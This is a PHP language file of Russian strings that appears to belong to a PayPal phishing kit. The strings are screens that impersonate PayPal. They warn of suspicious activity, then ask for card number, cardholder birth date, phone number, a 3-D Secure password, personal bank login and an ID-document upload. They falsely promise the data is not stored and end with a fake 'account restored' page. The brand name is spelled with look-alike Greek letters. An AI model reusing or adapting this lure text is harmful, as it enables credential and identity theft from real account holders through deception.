<?
$language = array(
    'suspecious' => array(
        '1' => 'Чтобы защитить Ваш аккаунт, мы регулярно ищем доказательства возможной мошеннической деятельности.',
        '2' => 'Ваша безопасность является нашим приоритетом.',
        '3' => 'Так как мы не распознали устройство или место, с которого Вы вошли в последний раз, мы хотели бы подтвердить Вашу личность. Мы хотим убедиться, что это Ваша учетная запись. ',
        '4' => 'Продолжить',
    ),
    'update'     => array(
        'navbar'     => array(
            '1' => 'Резюме',
            '2' => 'Активность',
            '3' => 'Отправить запрос',
            '4' => 'Кошелек',
            '5' => 'Магазин',
            '6' => 'Выйти',
        ),
        'sub_navbar' => array(
            '1' => 'Счет',
            '2' => 'Безопасность',
            '3' => 'Платежи',
            '4' => 'Уведомления',
        ),
        '1'          => 'Профиль',
        '2'          => 'Обновить фотографию',
        '3'          => 'Регистрация в',
        '4'          => 'Правка',
        '5'          => array(
            '1' => 'Вход Авторизован',
            '2' => 'Подтвердите свою кредитную карту',
            '3' => 'Подтвердите свой банковский счет',
            '4' => 'Подтвердите Вашу личность',
        ),
        '6'          => 'Адрес',
        '7'          => 'Первичный, подтвержденный адрес',
        '8'          => 'Подтвердить',
    ),

    'vbv'        => array(
        'lines' => array(
            '1' => 'Добавлена онлайн безопасность',
            '2' => 'помогает защитить Вашу',
            '3' => 'карту от несанкционированного использования онлайн - без каких-либо дополнительных затрат. Использовать',
            '4' => 'для этой и следующих покупок. Закончив эту страницу Вы создадите свой собственный',
            '5' => 'Пароль',
        ),
        '1'     => 'Торговец',
        '2'     => 'Сумма',
        '3'     => 'Дата',
        '4'     => 'Номер карты',
        '5'     => 'Тип карты',
        '6'     => 'Название банка',
        '7'     => 'Имя, в точности, как на карте',
        '8'     => 'Дата рождения владельца карты',
        '9'     => 'Номер телефона',
    ),

    'bank'       => array(
        'navbar'     => array(
            '1' => 'Резюме',
            '2' => 'Активность',
            '3' => 'Отправить запрос',
            '4' => 'Кошелек',
            '5' => 'Магазин',
            '6' => 'Выйти',
        ),
        'sub_navbar' => array(
            '1' => 'Счет',
            '2' => 'Безопасность',
            '3' => 'Платежи',
            '4' => 'Уведомления',
        ),
        '1'          => 'Профиль',
        '2'          => 'Обновить фотографию',
        '3'          => 'Регистрация в',
        '4'          => 'Правка',
        '5'          => array(
            '1' => 'Вход Авторизован',
            '2' => 'Кредитная карта верифицирована',
            '3' => 'Подтвердите свой банковский счет',
            '4' => 'Подтвердите Вашу личность',
        ),
        '6'          => 'Выберите свой банк',
        '7'          => 'Нет банковского счета?',
        '8'          => array(
            '1' => 'Используйте свой',
            '2' => 'Персональный банковский логин, чтобы привязать свой банк. Мы не сохраняем эту информацию.',
            '3' => 'При нажатии',
            '4' => 'Вы соглашаетесь на',
            '5' => 'Условия и положения',
            '6' => 'для подсоединения вашего банковского счета.',
        ),
        '9'          => array(
            '1' => 'Используйте свои',
            '2' => 'Банковские реквизиты, чтобы привязать свой банк. Мы не сохраняем эту информацию.',
        ),
        'identity'   => array(
            'navbar'     => array(
                '1' => 'Резюме',
                '2' => 'Активность',
                '3' => 'Отправить запрос',
                '4' => 'Кошелек',
                '5' => 'Магазин',
                '6' => 'Выйти',
            ),
            'sub_navbar' => array(
                '1' => 'Счет',
                '2' => 'Безопасность',
                '3' => 'Платежи',
                '4' => 'Уведомления',
            ),
            '1'          => 'Профиль',
            '2'          => 'Обновить фотографию',
            '3'          => 'Регистрация в',
            '4'          => 'Правка',
            '5'          => array(
                '1' => 'Вход Авторизирован',
                '2' => 'Кредитная карточка верифицирована',
                '3' => 'Банковский счет подтвержден',
                '4' => 'Подтвердите Вашу личность',
            ),
            '6'          => 'Подтвердить Вашу личность',
            '7'          => 'Перетащите либо выберите...',
            '8'          => 'Нет документа, подтверждающего личность в данный момент? ',
        ),
        'thanks'     => array(
            'navbar'  => array(
                '1' => 'Резюме',
                '2' => 'Активность',
                '3' => 'Отправить запрос',
                '4' => 'Кошелек',
                '5' => 'Магазин',
                '6' => 'Выйти',
            ),
            'content' => array(
                '1' => 'Ваша учетная запись полностью восстановлена',
                '2' => 'Спасибо за пройденную процедуру восстановления доступа к учетной записи.',
                '3' => 'Ваше терпение и усилия повысят безопасность всего нашего сообщества.',
                '4' => 'PayPal следит за безопасностью ваших счетов, бизнеса и финансовых данных так же серьезно, как это делаете Вы,',
                '5' => 'и постоянные проверки нашей системы способствуют высокому уровню безопасности.',
                '6' => 'Ваша учетная запись будет верифицирована в течение следующих 24 часов.',
                '7' => 'Выйти',
                '8' => 'Вы будете переправлены на свой счет ΡayΡal, в течение 10 секунд.',
            ),
        )));
?>